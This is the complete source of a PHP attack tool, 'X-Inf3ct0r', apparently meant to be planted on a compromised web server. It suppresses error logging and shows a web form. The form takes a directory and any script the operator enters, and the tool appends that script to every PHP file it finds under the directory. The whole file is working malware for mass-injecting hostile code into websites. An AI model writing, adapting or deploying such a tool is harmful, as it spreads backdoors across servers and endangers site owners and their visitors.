<?php
/*
 * X-Inf3ct0r
 * Infecting PHP script with your evil script
 * 
 * ./MyHeartIsyr
 */
@set_time_limit(0);@ini_set('error_log', null);@ini_set('display_errors',0);@ini_set('log_errors',0);
$gf=str_replace("\\","/",@getcwd());
function infect($dir, $evilscr){
	if($sken=@opendir($dir)){
		while($read=@readdir($sken)){
			$file = "$dir/$read";
			$ext=strtolower(substr(strrchr($read,"."),1));
			if($read=="." || $read=="..")continue;
			if(is_dir($file)){$new="$dir/$read";infect($new,$evilscr);}
			if($ext == "php" && $read != basename($_SERVER['SCRIPT_FILENAME'])){
				$fp=@fopen($file, "a");
				if(fwrite($fp, $evilscr)){
					echo "[+] $file -> [<font color='lime'>Done</font>]<br>";
				}
				else {
					echo "[+] $file -> [<font color='red'>Unable to Infect</font>]<br>";
				}
			}
		}
	}
	closedir($sken);
}

echo "<title>X-Inf3ct0r by ./MyHeartIsyr</title>
<style>
@font-face{font-family:i;src:url(https://github.com/peternakshell/php-x-inf3ct0r/blob/master/i.woff2) format('woff2'),
url(https://github.com/peternakshell/php-x-inf3ct0r/blob/master/i.woff) format('woff');}
body{background:#000;color:#fff;font-family:Courier New;}
#title{text-align:center;font-size:calc(2.3em + 2.3vw);color:#fff;font-family:i;}
input{background:transparent;border:1px solid #333;color:#fff;}
textarea{width:600px;height:50%;border:1px solid #333;resize:none;background:transparent;color:#fff;}
</style>
<body>
<div id='title'>X-Inf3ct0r</div><br>
<center><form method='post'>
Directory: <input type='text' name='xdir' value='".$gf."' style='width:300px;'><br><br>
Script:<br><textarea name='xscr' placeholder=\"Your Script Goes Here\"></textarea><br>
<input type='submit' name='goinfect' value='Infect' style='width:200px;'></form></center>
</body>";

if(isset($_POST['goinfect'])){
	$mydir=$_POST['xdir'];
	$myscr=$_POST['xscr'];
	if(!is_dir($mydir)){
		echo "<script>alert('Please, insert a directory');</script>";
	}
	infect($mydir, $myscr);
}
